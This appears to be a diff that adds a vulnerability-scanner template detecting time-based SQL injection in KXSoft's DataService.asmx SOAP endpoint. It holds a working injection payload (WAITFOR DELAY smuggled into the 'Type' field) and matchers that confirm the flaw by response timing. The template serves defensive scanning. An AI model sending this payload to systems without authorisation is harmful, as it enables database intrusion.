@@ -1,0 +1,48 @@
+id: kxsoft-dataservice-asmx-sqli
+info:
+  name: KXSoft DataService.asmx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detected SQL injection vulnerability in KXSoft's DataService.asmx endpoint.
+
+variables:
+  t1: '{{rand_int(5,10)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - raw:
+      - |
+        POST /DataService.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/ExeAppCmd"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+        <ExeAppCmd xmlns="http://tempuri.org/">
+        <str>{"cmd":"get_sb_guanli","Type":"1');WAITFOR DELAY '0:0:{{t1}}'--"}</str>
+        <files>MTIz</files>
+        </ExeAppCmd>
+        </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"cmd\":\"get_sb_guanli\""
+          - "<ExeAppCmdResult>"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+      - type: dsl
+        dsl:
+          - "duration > t1 && duration < t2"
